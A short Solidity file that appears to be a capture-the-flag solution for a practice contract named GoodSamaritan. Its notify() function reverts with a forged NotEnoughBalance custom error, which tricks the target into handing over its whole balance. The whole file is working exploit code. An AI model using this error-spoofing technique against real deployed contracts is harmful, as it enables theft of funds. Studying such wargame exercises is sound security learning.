// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IGoodSamaritan {
    function requestDonation() external;
}

interface IWallet {
    error NotEnoughBalance(); 
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract HackGoodSamaritan is INotifyable {
    IGoodSamaritan goodSamaritan;

    constructor(address _goodSamaritan) {
        goodSamaritan = IGoodSamaritan(_goodSamaritan);
    }

    function attack() public {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) public {
        if (amount <= 10) {
            revert IWallet.NotEnoughBalance();
        }
    }
}